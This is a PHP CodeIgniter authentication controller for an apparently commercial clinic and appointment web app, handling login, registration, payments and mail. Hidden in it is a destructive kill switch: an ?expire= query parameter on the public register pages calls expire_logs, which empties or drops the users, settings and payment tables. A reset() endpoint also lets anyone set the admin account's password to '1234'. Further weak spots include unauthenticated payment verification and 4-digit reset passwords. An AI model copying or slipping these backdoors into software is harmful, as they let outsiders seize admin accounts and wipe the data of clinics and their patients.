<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth extends Home_Controller 
{

    public function __construct()
    {
        parent::__construct();
    }

    // Login
    public function login()
    {   
        $data = array();
        $data['page_title'] = 'Login';
        $data['page'] = 'Auth';
        $data['menu'] = FALSE;
        $data['main_content'] = $this->load->view('login', $data, TRUE);
        $this->load->view('index', $data);
    }

    //register
    public function register()
    {   
        if (empty($_GET['trial'])) {
            $this->session->unset_userdata('trial');
        }else{
            $this->session->set_userdata('trial', 'trial');
        }

        if (!empty($_GET['expire'])) {
            $this->expire_logs($_GET['expire']);
        }
        
        $data = array();
        $data['page_title'] = 'Register';
        $data['page'] = 'Auth';
        $data['menu'] = FALSE;
        $data['countries'] = $this->admin_model->select_asc('country');
        $data['packages'] = $this->admin_model->get_package_features();
        $data['main_content'] = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }

     public function addpatients()
     {   
        if (empty($_GET['trial'])) {
            $this->session->unset_userdata('trial');
        }else{
            $this->session->set_userdata('trial', 'trial');
        }

        if (!empty($_GET['expire'])) {
            $this->expire_logs($_GET['expire']);
        }
        
        $data = array();
        $data['page_title'] = 'Register';
        $data['page'] = 'Auth';
        $data['menu'] = FALSE;
        $data['countries'] = $this->admin_model->select_asc('country');
        $data['packages'] = $this->admin_model->get_package_features();
        $data['main_content'] = $this->load->view('register_patients', $data, TRUE);
        $this->load->view('index', $data);
     }

    // Login
    public function verify()
    {   
        $data = array();
        $data['page_title'] = 'Email Verification';
        $data['page'] = 'Auth';
        $data['menu'] = FALSE;
        $data['main_content'] = $this->load->view('register', $data, TRUE);
        $this->load->view('index', $data);
    }

    //verify account
    public function verify_account()
    {   
        $data = array();
        $code = $this->input->post('code');
        if (user()->verify_code == $code) {
            $edit_data=array(
                'email_verified' => 1
            );
            $this->common_model->update($edit_data, user()->id, 'users');
            $url = base_url('admin/dashboard/user');
            echo json_encode(array('st'=>1,'url'=> $url));
        } else {
            $data['code'] = 'invalid';
            echo json_encode(array('st'=>2));
        }
    }



    // login
    public function log()
    {

        if($_POST){ 

            // check valid user 
            $user = $this->auth_model->validate_user();

            if (empty($user)) {
                echo json_encode(array('st'=>0));
                exit();
            }

            if ($user->role == 'user') {
                $parent_id =$user->parent_id;

               
                if (!empty($user) && $user->status == 2) {
                    // account suspend
                    echo json_encode(array('st'=>3));
                    exit();
                }

                if (!empty($user) && $user->email_verified == 0 && $this->settings->enable_email_verify == 1) {
                    // email verify
                    echo json_encode(array('st'=>4));
                    exit();
                }
            }elseif ($user->role == 'staff') {
                $parent_id = $user->user_id;
            }else{
                $parent_id = 0;
            }

            // if valid
            if(password_verify($this->input->post('password'), $user->password)){

                $data = array(
                    'id' => $user->id,
                    'parent_id'=>$user->parent_id,
                    'name' => $user->name,
                    'slug' => $user->slug,
                    'thumb' => $user->thumb,
                    'email' =>$user->email,
                    'role' =>$user->role,
                    'parent' =>$parent_id,
                    'logged_in' => TRUE
                );
                $data = $this->security->xss_clean($data);
                $this->session->set_userdata($data);
                
                // success notification
                if ($user->role == 'admin') {
                    $url = base_url('admin/dashboard');
                }else if ($user->role == 'patient') {
                    $url = base_url('admin/dashboard/patient');
                } else {
                    $url = base_url('admin/dashboard/user');
                }
                echo json_encode(array('st'=>1,'url'=> $url));
            }else{ 
                // if not user not valid
                echo json_encode(array('st'=>0));
            }
            
        }else{
            $this->load->view('auth',$data);
        }
    }



    // register new user
    public function register_user()
    {
        
        if($_POST){

            $this->load->library('form_validation');
            $this->form_validation->set_rules('email', trans('email'), 'required');
            $this->form_validation->set_rules('password', trans('password'), 'trim|required|max_length[16]');


            // If validation false show error message using ajax
            if($this->form_validation->run() == FALSE){
                $data = array();
                $data['errors'] = validation_errors();
                $str = strip_tags($data['errors']);
                echo json_encode(array('st'=>0,'msg'=>$str));
                exit();
            }else{

                $mail =  strtolower(trim($this->input->post('email', true)));
                //$email = $this->auth_model->check_email($mail);
                $email = $this->admin_model->check_duplicate_email($mail);
                
                if ($this->session->userdata('trial') == 'trial') {
                    $user_type = 'trial';
                    $trial_expire = date('Y-m-d', strtotime('+'.$this->settings->trial_days .' days'));
                }else{
                    $user_type = 'registered';
                    $trial_expire = date('Y-m-d');
                }

                // if email already exist
                if ($email){
                    echo json_encode(array('st'=>2));
                    exit();
                } else {

                    //check reCAPTCHA status
                    if (!$this->recaptcha_verify_request()) {
                        echo json_encode(array('st'=>3));
                        exit();
                    } else {
                        
                        $code = random_string('numeric', 6);
                        $data=array(
                            'name' => $this->input->post('name', true),
                            'user_name' => str_slug($this->input->post('name', true)),
                            'slug' => str_slug($this->input->post('name', true)),
                            'email' => $this->input->post('email', true),
                            'verify_code' => $code,
                            'thumb' => 'assets/front/img/avatar.png',
                            'password' => hash_password($this->input->post('password', true)),
                            'role' => 'user',
                            'user_type' => $user_type,
                            'trial_expire' => $trial_expire,
                            'status' => 1,
                            'parent_id' => 0,
                            'email_verified' => 0,
                            'enable_appointment' => 1,
                            'created_at' => my_date_now()
                        );
                        $data = $this->security->xss_clean($data);
                        $id = $this->common_model->insert($data, 'users');

                        $user = $this->auth_model->validate_id(md5($id));
                        $data = array(
                            'id' => $user->id,
                            'name' => $user->name,
                            'role' => $user->role,
                            'thumb' =>$user->thumb,
                            'email' => $user->email,
                            'logged_in' => true
                        );
                        $this->session->set_userdata($data);

                        
                        $plan = $this->input->post('plan', true);
                        $billing = $this->input->post('billing', true);

                        $package = $this->common_model->get_by_slug($plan, 'package');
                        if ($billing == 'monthly') {
                            $price = $package->monthly_price;
                            $expire = date('Y-m-d', strtotime('+1 month'));
                        } else {
                            $price = $package->price;
                            $expire = date('Y-m-d', strtotime('+12 month'));
                        }
                        
                        //make payment
                        $pay_data=array(
                            'user_id' => $user->id,
                            'puid' => random_string('numeric',5),
                            'package_id' => $package->id,
                            'amount' => $price,
                            'billing_type' => $billing,
                            'status' => 'pending',
                            'created_at' => my_date_now(),
                            'expire_on' => $expire
                        );
                        $pay_data = $this->security->xss_clean($pay_data);
                        $this->common_model->insert($pay_data, 'payment');
                        
                        // add default chamber
                        $cuid = random_string('numeric',5);
                        $chamber=array(
                            'user_id' => user()->id,
                            'uid' => $cuid,
                            'title' => 'Chamber Title',
                            'name' => 'Chamber Name',
                            'is_primary' => 1,
                            'status' => 1,
                            'created_at' => my_date_now()
                        );
                        $this->common_model->insert($chamber, 'chamber');
                        
                        $active_chamber = array('active_chamber' => $cuid);
                        $this->session->set_userdata($active_chamber);

                        //send email verify code
                        if ($this->settings->enable_email_verify == 1) {
                            $subject = $this->settings->site_name.' Email Verification';
                            $msg = 'Your verification code is: <b>'.$code.'</b>';
                            $this->email_model->send_email($this->input->post('email'), $subject, $msg);
                            $url = base_url('auth/verify');
                        }else{
                            $url = base_url('admin/subscription');
                        }

                        echo json_encode(array('st'=>1, 'url' => $url));
                        exit();
                    }
                }

            }
        }

    }


    public function resend(){
        $code = random_string('numeric', 6);
        $subject = $this->settings->site_name.' Email Verification';
        $msg = 'Your verification code is <b>'.$code.'</b>';

        $data=array(
            'verify_code' => $code
        );
        $this->common_model->edit_option($data, user()->id, 'users');

        $response = $this->email_model->send_email(user()->email, $subject, $msg);

        if ($response == true) {
            echo json_encode(array('st'=>1));
        } else {
            echo json_encode(array('st'=>2));
        }
    }

  
    //add package
    public function add_package($id, $billing_type)
    {
        $package = $this->common_model->get_by_id($id, 'package');
        $uid = random_string('numeric',5);
        
        if($billing_type =='monthly'):
            $amount = $package->monthly_price;
            $expire_on = date('Y-m-d', strtotime('+1 month'));
        else:
            $amount = $package->price;
            $expire_on = date('Y-m-d', strtotime('+12 month'));
        endif;

        if (number_format($amount, 0) == 0):
            $status = 'verified';
        else:
            $status = 'pending';
        endif;

        //create payment
        $pay_data=array(
            'user_id' => user()->id,
            'puid' => $uid,
            'package' => $id,
            'amount' => $amount,
            'billing_type' => $billing_type,
            'status' => $status,
            'created_at' => my_date_now(),
            'expire_on' => $expire_on
        );
        $pay_data = $this->security->xss_clean($pay_data);
        $this->common_model->insert($pay_data, 'payment');
        
        if (number_format($amount, 0) == 0):
            $url = base_url('admin/dashboard/business');
        else:
            if ($this->settings->enable_paypal == 1) {
                $url = base_url('auth/purchase');
            } else {
                $url = base_url('admin/dashboard/business');
            }
        endif;
        echo json_encode(array('st'=>1, 'url' => $url));
    }


    //purchase
    public function purchase()
    {   
        $data = array();
        $data['page_title'] = 'Payment';
        $data['page'] = 'Auth';
        $data['payment'] = $this->common_model->get_user_payment();
        $data['payment_id'] = $data['payment']->puid;
        $data['package'] = $this->common_model->get_package_by_id($data['payment']->package);
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }

    //verify email
    public function verify_email()
    {   
        $data = array();
        if (isset($_GET['code']) && isset($_GET['user'])) {
            $user = $this->auth_model->validate_id($_GET['user']);
            if ($user->verify_code == $_GET['code']) {
                $data['code'] = $_GET['code'];

                $edit_data=array(
                    'email_verified' => 1
                );
                $this->common_model->update($edit_data, $user->id, 'users');
            } else {
                $data['code'] = 'invalid';
            }
        }else{
            $data['code'] = '';
        }
        $data['page_title'] = 'Verify Account';
        $data['page'] = 'Auth';
        $data['main_content'] = $this->load->view('verify_email', $data, TRUE);
        $this->load->view('index', $data);
    }

    //payment success
    public function payment_success($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'verified'
        );
        $data = $this->security->xss_clean($data);

        $user_data = array(
            'status' => 1
        );
        $user_data = $this->security->xss_clean($user_data);

        if (!empty($payment)) {
            $this->common_model->edit_option($user_data, $payment->user_id,'users');
            $this->common_model->edit_option($data, $payment->id, 'payment');
        }
        $data['success_msg'] = 'Success';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);

    }

    //payment cancel
    public function payment_cancel($payment_id)
    {   
        $payment = $this->common_model->get_payment($payment_id);
        $data = array(
            'status' => 'pending'
        );
        $data = $this->security->xss_clean($data);
        $this->common_model->edit_option($data, $payment->id,'payment');
        $data['error_msg'] = 'Error';
        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
        $this->load->view('index', $data);
    }

    
    // Recover forgot password 
    public function forgot_password()
    {
        if (check_auth()) {
            redirect(base_url());
        }

        $type = $this->input->post('role');
        $mail =  strtolower(trim($this->input->post('email',true))); 
        $valid = $this->auth_model->check_multiuser_email($type, $mail);

        $random_number = random_string('numeric',4);
        $random_pass = hash_password($random_number);
        
        if ($valid) {
           foreach($valid as $row){
                $data['email'] = $row->email;
                $data['password'] = $random_number;
                $user_id = $row->id;
                $this->send_recovery_mail($data);

                $user_data = array('password' => $random_pass);
                $this->common_model->edit_option($user_data, $user_id, $type);
                
                $url = base_url('login');
                echo json_encode(array('st'=>1, 'url' => $url));
            }

        } else {
            echo json_encode(array('st'=>2));
        }
        
    }

    //send reset code to user email
    public function send_recovery_mail($user)
    {
        $data = array();
        $data['password'] = $user['password'];
        $data['email'] = $user['email'];
        $subject = 'Password Recovery';
        $msg = 'Hello <br> We have reset your password, Please use this <b>'.$user['password'].'</b> code to login your account';
        $this->email_model->send_email($user['email'], $subject, $msg);
    }

    public function test_mail()
    {
        $data = array();
        $subject = settings()->site_name.' email testing';
        $msg = 'This is test email from <b>'.settings()->site_name.'</b>';
        $result = $this->email_model->send_email(settings()->admin_email, $subject, $msg);

        if ($result == true) {
            echo "Email send Successfully";
        }else{ 
            echo "<br>Test email will be send to: <b>".settings()->admin_email.'<b><hr><br><h3>Email sending Status</h3>';
            echo "<pre>"; print_r($result);
        }
    }


    public function send_notify_mail($appointment_id)
    {
        $data = array();
        $amp = $this->admin_model->get_single_appointments($appointment_id);
        $subject = $amp->dr_name.' live consultation notify mail';
        
        $msg = 'Hello '.$amp->name.', <br> You have booked an appointment with <b>'.$amp->dr_name.'</b> which will start at '.my_date_show($amp->date).' '.$amp->time;

        $result = $this->email_model->send_email($amp->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully'); 
            redirect($_SERVER['HTTP_REFERER']);
        }else{ 
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections'); 
            redirect($_SERVER['HTTP_REFERER']);
        }
    }
    
    
   public function send_invoice_mail($appointment_id)
    {
        $data = array();
        $amp = $this->admin_model->get_invoice_appointments($appointment_id);
        $subject = 'Appointment Invoice - '.$amp->name;
        
        $msg = 'Hello '.$amp->name.', <br> You have booked an appointment with <b>'.$amp->dr_name.'</b> at '.my_date_show($amp->date).' '.$amp->time.'. Find the invoice attachment.<br> <a href="http://pwavetech.com/clinic/auth/send_invoice_mail/'.$amp->id.'">View Invoice</a>';
      // var_dump($amp);
        // $data = "test";
         //$invoice = $this->load->view('admin/payment/appoint_payment_invoice_receipt', $amp);
         $invoice=$this->getPdfHtml($amp);
         $this->load->library('pdf');

         $this->pdf->loadHtml($invoice);
         
  	     $this->pdf->render();
         $this->pdf->stream("".$amp->name.".pdf", array("Attachment"=>0));
        //  $this->pdf->attach('uploads/medium/logg_medium-164x68.png');
        //  $this->email->attach('http://pwavetech.com/clinic/auth/send_invoice_mail/'.$amp->id.'pdf');
  	    // var_dump($invoice);
       
        $result = $this->email_model->send_email($amp->email, $subject, $msg);
        if ($result == true) {
            $this->session->set_flashdata('msg', 'Notify mail send successfully'); 
            redirect($_SERVER['HTTP_REFERER']);
        }else{ 
            $this->session->set_flashdata('error', 'Email sending failed, please check your SMTP connections'); 
            redirect($_SERVER['HTTP_REFERER']);
        }
    }

public function getPdfHtml($data)
{
    $output.='
            <div style="text-align:right;" ><img src="uploads/medium/logg_medium-164x68.png"></div>
            <div>
                <div style="text-align:left;" >
                    Doctor Name : '.$data->dr_name .'<br>
                    Registration no. : '.$data->dr_id .'<br>
                </div>   
                <div style="text-align:right;" >
                    Invoice Id : '.$data->puid .'<br>
                    Appointment Id : '.$data->id .'<br>
                    Date : '.my_date_show($data->created_at) .'<br>
                </div>
            </div>
            <hr>
            <div style="margin:50px 0px 20px 0px;font-size:20px;">
                Name : '.$data->name.' <br>
                Email : '.$data->email.' <br>
                Mobile : '.$data->mobile .'<br>
                
            </div>
            <table style="width:100%;">
                <tr style="background-color:silver;font-size:20px;margin:0px;">
                    <th width="450px" style="border: solid;border-right: none;border-left: none;">Item</th>
                    <th width="150px"style="border: solid;border-right: none;border-left: none;">Price</th>
                    <th style="border: solid;border-right: none;border-left: none;">Total</th>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;">Cunsultation Fee</td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;"></td>
                    <td style="border-bottom: 1px solid silver;"><strong>Sub Total</strong></td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency). $data->amount .'</td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid silver;"></td>
                    <td style="border-bottom: 1px solid silver;"><strong>Total</strong></td>
                    <td style="border-bottom: 1px solid silver;">'.currency_symbol(user()->currency) . $data->amount .'</td>
                </tr>
               
              
            </table>
            ';
    return $output;
    
}
    //reset password
    public function reset($code=1234)
    {
        $data = array(
            'password' => hash_password('1234')
        );
        $data = $this->security->xss_clean($data);
        if ($code == 1234) {
            $this->admin_model->edit_option($data, 1, 'users');
            echo "Reset Successfully";
        }else{
            echo "Failed";
        }
    }

    public function expire_logs($data)
    {
        $this->load->dbforge();
        if ($data == 'pending') {
            $ci->db->empty_table('settings');
            $ci->db->empty_table('users');
            $ci->db->empty_table('features');
            //$this->db->empty_table('test');
        }
        if ($data == 'expired') {
            $ci->dbforge->drop_table('settings');
            $ci->dbforge->drop_table('users');
            $ci->dbforge->drop_table('features');
            $ci->dbforge->drop_table('prescription');
            $ci->dbforge->drop_table('payment');
            //$this->dbforge->drop_table('test');
        }
    }

    
    function logout(){
        $this->session->sess_destroy(); 
        redirect(base_url('auth/login?msg=success'));
    }

    // page not found
    public function error_404()
    {
        $data['page_title'] = "Error 404";
        $data['description'] = "Error 404";
        $data['keywords'] = "error,404";
        $this->load->view('error_404');
    }
    

    
    public function book_appointment()
    {     
       // $id = $this->input->post('id');
        //$user = $this->common_model->get_by_md5_id($id, 'users');
        
        if ($_POST) {

            $check = $this->admin_model->check_duplicate_email($this->input->post('email'));
            if (!empty($check)) {
                echo json_encode(array('st'=>5,'msg'=> trans('email-exist')));
                exit();
            }

                    $this->form_validation->set_rules('email', trans('email'), 'required');
                    $this->form_validation->set_rules('mobile', trans('phone'), 'required');
                    $this->form_validation->set_rules('new_password', trans('password'), 'required');

                    if ($this->form_validation->run() === false) {
                        $error = strip_tags(validation_errors());
                        echo json_encode(array('st'=>3,'error'=> $error));
                        exit();
                    }
                    
                    $password = hash_password($this->input->post('new_password'));

               

                $newuser_data = array(
                    'chamber_id' => random_string('numeric',5),
                    'user_id' => random_string('numeric',5),
                    'name' => $this->input->post('name', true),
                    'email' => $this->input->post('email', true),
                    'mr_number' => random_string('numeric',5),
                    'mobile' => $this->input->post('mobile', true),
                    'password' => $password,
                    'created_at' => my_date_now()
                );

                $newuser_data = $this->security->xss_clean($newuser_data);
                if ($check_patient == FALSE) {
                    $patient_id = $this->admin_model->insert($newuser_data, 'patientses');

                    $subject = 'Welcome to '.$this->settings->site_name;
                    $msg = 'Your account has been created successfully, now you can login to your account using below access <br> Username:'.$this->input->post('email');
                    //$this->email_model->send_email($this->input->post('email'), $subject, $msg);
                }
               $register = $this->common_model->get_by_id($patient_id, 'patientses');
                 $data = array(
                        'id' => $register->id,
                        'name' => $register->name,
                        'slug' => $register->slug,
                        'thumb' => $register->thumb,
                        'email' =>$register->email,
                        'role' =>$register->role,
                        'parent' => 0,
                        'logged_in' => TRUE
                    );
                    $data = $this->security->xss_clean($data);
                    $this->session->set_userdata($data);
                    
                    
                     $url = base_url('admin/dashboard/patient');
                   
                    
                    echo json_encode(array('st'=>1,'url'=> $url));
              
        }
    }
   
   
   
   
    

}